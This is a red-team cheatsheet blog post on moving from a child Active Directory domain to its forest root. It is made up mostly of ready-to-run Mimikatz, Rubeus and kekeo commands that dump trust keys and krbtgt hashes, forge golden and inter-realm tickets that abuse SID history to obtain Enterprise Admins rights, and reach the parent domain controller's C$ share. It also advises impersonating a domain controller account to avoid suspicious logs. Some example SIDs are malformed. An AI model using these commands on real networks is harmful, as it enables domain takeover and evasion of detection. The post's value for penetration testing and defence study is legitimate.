---
title: Across Domain Trusts cheatsheet
subtitle: Trusts are relationships between domains or forests which allows users of one domain or forest to access resources in the other domain or forest.

# Summary for listings and search engines
summary: Trusts are relationships between domains or forests which allows users of one domain or forest to access resources in the other domain or forest.

# Link this post with a project
projects: []

# Date published
date: '2022-09-08T00:00:00Z'

# Date updated
lastmod: '2022-09-08T00:00:00Z'

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Giovanni Pecoraro**](https://unsplash.com/photos/CpkOjOcXdUY)'
  focal_point: ''
  placement: 2
  preview_only: false

authors:
  - admin

tags:
  - Red Teaming
  - Windows
  - Active Directory
  - Trusts
  
categories:
  - Cyber Security

---

Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.  There are two ways of escalating privileges between two domains of same forest: 

- Krbtgt hash 
- Trust Tickets

## Child to Parent using Trust Tickets

1. Look for [In] trust key from child to parent:

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName "cyberlab-dc.cyberlab.cybercorp.local"
Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberlab\cybercorp$"'
```

2. An inter-realm TGT can be forged: 

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"Kerberos::golden /user:[USER] /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /rc4:[TRUST_KEY_NTLM] /service:krbtgt /target:[PARENT_DOMAIN_FQDN] /ticket:[TICKET_EXPORT_PATH]"'

Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:cybercorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
```

| Parameter	| Optional| Description |
| --------------| ------- | ----------- |
| **/user**	| No    | Username to impersonate |
| **/domain**	| No	| Domain FQDN |
| **/sid**	| No	| SID of the current domain |
| **/sids**	| No	| SID of the enterprise admins group of the parent domain |
| **/rc4**	| No	| NTLM (RC4) hash of the trust key account. Use **/aes128** and **/aes256** for using AES keys |
| **/target**	| No	| Target server FQDN |
| **/service**	| No	| Target service in the parent domain (krbtgt) |
| /id		| Yes	| User RID (default 500) |
| /groups	| Yes	| Group RID (default 513 512 520 518 519) |
| /startoffset	| Yes	| When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin	| Yes	| Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax	| Yes	| Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |
| /ptt	| 	| Injects the ticket into the current PowerShell process (no need to save the ticket on disk) |
| **/ticket**	|	| Saves the ticket to a file for later use |

3. Get a TGS for a service (e.g. CIFS) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well:

```powershell
# asktgs.exe 
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/cybercorp-dc.cybercorp.local
```

4. Use the TGS to access the targeted service (may need to use it twice). 

```powershell
# kirbikator.exe
.\kirbikator.exe lsa .\CIFS.cybercorp-dc.cybercorp.local.kirbi
```

5. Access the file share on the parent domain DC:

```powershell
ls \\cybercorp-dc.cybercorp.local\c$
```

Alternatively, it is possible to use `Kekeo` to ask for the TGS:
```powershell
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:CIFS/cybercorp-dc.cybercorp.local /dc:cybercorp-dc.cybercorp.local /ptt
```

## Child to Parent using krbtgt hash

1. Look for krbtgt hash:

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName "cyberlab-dc.cyberlab.cybercorp.local"
```

2. Generate a Golden Ticket forcing the SID History parameter. We will abuse SID history once again. The mimkatz option "/sids" is forcefully setting the SID History for the Enterprise Admin group for cyberlab.cybercorp.local that is the Forest Enterprise Admin Group:

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /krbtgt:[KRBTGT_NTLM_HASH] /ticket:[TICKET_EXPORT_PATH]"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
```

3. Pass the ticket to the current session on any machine of the current domain:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"' 
```

4. Now, it is possible to access to machine services in the forest root domain:

```powershell
ls \\cybercorp-dc.cybercorp.local\c$
gwmi -class win32_operatingsystem -ComputerName cybercorp-dc.cybercorp.local
```

In order to avoid suspicious logs, impersonate Domain Controller account add to the SID History the SIDs of parent Domain Controllers group and Enterprise Domain Controllers group and set the group to 516 (Enterprise Admins group).

| Group				| SID			  |
| ------------------------------| ----------------------- | 
| Domain Controllers 		| S-1-5-21-[DOMAIN_ID]-516|
| Enterprise Domain Controllers	| S-1-5-9		  |

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:[DC_NAME]$ /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /groups:516 /sids:[PARENT_DOMAIN_CONTROLLERS_GROUP_SID],[ENTERPRISE_DOMAIN_CONTROLLERS_GROUP_SID] /krbtgt:[KRBTGT_HASH] /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /user:dc$ /domain:cyberlab.cybercorp.local /sid:S-1-5-211874506631-3219952063-538504511 /groups:516 /sids:S-1-521-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'
```
---